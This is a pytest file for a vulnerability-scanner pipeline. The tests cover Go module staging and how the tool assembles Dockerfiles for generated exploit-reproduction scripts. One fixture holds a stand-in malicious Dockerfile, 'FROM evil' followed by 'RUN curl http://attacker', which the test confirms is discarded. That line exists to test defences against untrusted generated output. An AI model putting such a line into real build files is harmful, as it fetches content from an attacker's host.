"""Tests for Go module staging and Dockerfile assembly."""

from __future__ import annotations

import os


def _write_min_go_module(root, module_path: str = "example.com/lib") -> None:
    root.mkdir(parents=True, exist_ok=True)
    (root / "go.mod").write_text(f"module {module_path}\n\ngo 1.20\n")
    (root / "lib.go").write_text(
        "package lib\n\n"
        "type Widget struct{ Name string }\n\n"
        "func NewWidget(name string) Widget { return Widget{Name: name} }\n"
    )
    nested = root / "nested"
    nested.mkdir()
    (nested / "extra.go").write_text("package lib\n\nfunc Extra() int { return 1 }\n")


def test_stage_go_module_copies_tree(tmp_path):
    from utilities.dynamic_tester.go_stage import stage_go_module

    repo = tmp_path / "repo"
    _write_min_go_module(repo)
    source = repo / "lib.go"

    work = tmp_path / "work"
    work.mkdir()
    source_basename, staged, module_import = stage_go_module(
        str(work), str(source), repo_path=str(repo)
    )

    assert source_basename == "lib.go"
    assert module_import == "example.com/lib"
    assert "module/go.mod" in staged
    assert "module/lib.go" in staged
    assert "module/nested/extra.go" in staged
    assert (work / "module" / "go.mod").is_file()
    assert (work / "module" / "nested" / "extra.go").is_file()


def test_finalize_go_dockerfile_uses_module_replace(tmp_path):
    from utilities.dynamic_tester.dockerfile_builder import apply_dockerfile_finalization

    generation = {
        "dockerfile": "# assembled by 911VulScan",
        "test_script": (
            'package main\n\n'
            'import (\n'
            '    "encoding/json"\n'
            '    "fmt"\n'
            '    "example.com/lib"\n'
            ')\n\n'
            'func main() {\n'
            '    _ = lib.NewWidget("x")\n'
            '    out, _ := json.Marshal(map[string]string{"status": "NOT_REPRODUCED"})\n'
            '    fmt.Println(string(out))\n'
            '}\n'
        ),
        "test_filename": "test_exploit.go",
    }
    finalized = apply_dockerfile_finalization(
        generation,
        staged_files=["module/go.mod", "module/lib.go"],
        language="go",
        go_module_path="example.com/lib",
    )

    dockerfile = finalized["dockerfile"]
    assert "FROM golang:1.25-alpine" in dockerfile
    assert "COPY module/ /module/" in dockerfile
    assert "go mod edit -replace=example.com/lib=/module" in dockerfile
    assert "go build -o /work/test_exploit" in dockerfile


def test_write_test_files_stages_go_module(tmp_path):
    from utilities.dynamic_tester.docker_executor import _write_test_files

    repo = tmp_path / "repo"
    _write_min_go_module(repo, module_path="github.com/emicklei/go-restful/v3")
    source = repo / "lib.go"

    generation = {
        "dockerfile": "FROM golang:1.25-alpine\nWORKDIR /work\n",
        "test_script": (
            'package main\n\n'
            'import (\n'
            '    "encoding/json"\n'
            '    "fmt"\n'
            '    restful "github.com/emicklei/go-restful/v3"\n'
            ')\n\n'
            'func main() {\n'
            '    _ = restful.NewContainer()\n'
            '    out, _ := json.Marshal(map[string]string{"status": "NOT_REPRODUCED"})\n'
            '    fmt.Println(string(out))\n'
            '}\n'
        ),
        "test_filename": "test_exploit.go",
    }

    work = tmp_path / "build"
    work.mkdir()
    finalized = _write_test_files(
        str(work),
        generation,
        source_file=str(source),
        language="go",
        repo_path=str(repo),
    )

    assert (work / "module" / "go.mod").is_file()
    assert "COPY module/ /module/" in finalized["dockerfile"]
    assert "github.com/emicklei/go-restful/v3=/module" in finalized["dockerfile"]


def test_finalize_generation_defers_dockerfile_assembly(tmp_path):
    from utilities.dynamic_tester.test_generator import _finalize_generation

    repo = tmp_path / "repo"
    _write_min_go_module(repo, module_path="github.com/emicklei/go-restful/v3")
    finding = {
        "id": "VULN-001",
        "location": {"file": "lib.go"},
    }
    repo_info = {"language": "go", "name": "test"}
    generation = {
        "dockerfile": "FROM evil\nRUN curl http://attacker",
        "test_script": (
            'package main\n\n'
            'import (\n'
            '    "encoding/json"\n'
            '    "fmt"\n'
            '    restful "github.com/emicklei/go-restful/v3"\n'
            ')\n\n'
            'func main() {\n'
            '    _ = restful.NewContainer()\n'
            '    out, _ := json.Marshal(map[string]string{"status": "NOT_REPRODUCED"})\n'
            '    fmt.Println(string(out))\n'
            '}\n'
        ),
        "test_filename": "test_exploit.go",
    }

    finalized = _finalize_generation(
        generation,
        finding,
        repo_info,
        repo_path=str(repo),
    )

    assert finalized is not None
    assert finalized["dockerfile"] == "# assembled by 911VulScan"
    assert "COPY module/" not in finalized["dockerfile"]


def test_stage_go_module_with_real_go_restful(tmp_path):
    from utilities.dynamic_tester.go_stage import stage_go_module

    repo = tmp_path / "repo"
    _write_min_go_module(repo, module_path="github.com/emicklei/go-restful/v3")
    source = repo / "lib.go"
    work = tmp_path / "work"
    work.mkdir()
    _, staged, module_import = stage_go_module(str(work), str(source), repo_path=str(repo))
    assert module_import == "github.com/emicklei/go-restful/v3"
    assert "module/go.mod" in staged
    assert "module/lib.go" in staged
